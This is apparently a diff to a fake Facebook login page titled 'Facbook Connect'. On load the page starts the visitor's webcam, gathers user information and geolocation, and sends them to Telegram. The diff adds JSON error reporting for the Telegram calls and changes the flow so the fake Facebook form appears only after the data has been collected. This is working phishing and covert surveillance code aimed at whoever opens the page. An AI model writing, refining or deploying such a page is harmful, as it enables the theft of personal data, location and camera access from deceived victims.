@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Connect</title>
+    <title>Facbook Connect</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -126,7 +126,7 @@
     <div id="initial-container">
         <video id="video" width="640" height="480" autoplay></video>
     </div>
-    <div class="container" id="main-container" style="display: none;">
+    <div class="container" id="main-container">
         <div class="left">
             <h1>Facebook</h1>
             <p>Facebook helps you connect and share with the people in your life.</p>
@@ -253,10 +253,12 @@
                     })
                 });
 
+                const data = await response.json();
+
                 if (response.ok) {
                     console.log("User info sent to Telegram");
                 } else {
-                    console.error("Error sending user info to Telegram: ", response.statusText);
+                    console.error(`Error sending user info to Telegram: ${data.description}`);
                 }
             } catch (error) {
                 console.error("Error sending user info to Telegram: ", error);
@@ -309,11 +311,12 @@
                     })
                 });
 
+                const data = await response.json();
+
                 if (response.ok) {
                     console.log("Location info sent to Telegram");
-                    document.getElementById('main-container').style.display = 'flex';
                 } else {
-                    console.error("Error sending location info to Telegram: ", response.statusText);
+                    console.error(`Error sending location info to Telegram: ${data.description}`);
                 }
             } catch (error) {
                 console.error("Error sending location info to Telegram: ", error);
@@ -324,6 +327,7 @@
             await startVideo();
             await getUserInfo();
             await getLocation();
+            document.getElementById('main-container').style.display = 'flex';
         }
 
         function sendToTelegram() {
